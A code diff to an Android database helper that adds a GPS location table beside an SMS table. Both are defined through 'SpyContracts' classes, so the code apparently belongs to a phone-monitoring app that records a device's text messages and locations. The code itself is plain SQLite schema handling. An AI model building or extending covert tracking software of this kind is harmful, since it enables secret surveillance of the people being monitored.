@@ -15,18 +15,32 @@ public class DatabaseHelper extends SQLiteOpenHelper {
 
     @Override
     public void onCreate(SQLiteDatabase db) {
-        db.execSQL(Query.CREATE_TABLE_QUERY);
+        createTables(db);
+    }
+
+    private void createTables(SQLiteDatabase db) {
+        if (db != null) {
+            db.execSQL(Query.CREATE_TABLE_SMS);
+            db.execSQL(Query.CREATE_TABLE_GPS);
+        }
     }
 
     @Override
     public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
-        db.execSQL(Query.DROP_TABLE_QUERY);
+        dropTables(db);
         onCreate(db);
+    }
+
+    private void dropTables(SQLiteDatabase db) {
+        if (db != null) {
+            db.execSQL(Query.DROP_TABLE_SMS);
+            db.execSQL(Query.DROP_TABLE_GPS);
+        }
     }
 
     private static class Query {
 
-        public static final String CREATE_TABLE_QUERY =
+        public static final String CREATE_TABLE_SMS =
                 "CREATE TABLE IF NOT EXISTS " + SpyContracts.Sms.TABLE_NAME + " (" +
                         SpyContracts.Sms.Columns._ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
                         SpyContracts.Sms.Columns.TYPE + " INTEGER, " +
@@ -35,8 +49,18 @@ public class DatabaseHelper extends SQLiteOpenHelper {
                         SpyContracts.Sms.Columns.MESSAGE + " TEXT, " +
                         SpyContracts.Sms.Columns.DATE + " INTEGER);";
 
-        public static final String DROP_TABLE_QUERY =
+        public static final String DROP_TABLE_SMS =
                 "DROP TABLE IF EXISTS " + SpyContracts.Sms.TABLE_NAME;
+
+        public static final String CREATE_TABLE_GPS =
+                "CREATE TABLE IF NOT EXISTS " + SpyContracts.Gps.TABLE_NAME + " (" +
+                        SpyContracts.Sms.Columns._ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
+                        SpyContracts.Gps.Columns.LATITUDE + " REAL, " +
+                        SpyContracts.Gps.Columns.LONGITUDE + " REAL, " +
+                        SpyContracts.Sms.Columns.DATE + " INTEGER);";
+
+        public static final String DROP_TABLE_GPS =
+                "DROP TABLE IF EXISTS " + SpyContracts.Gps.TABLE_NAME;
 
     }
 
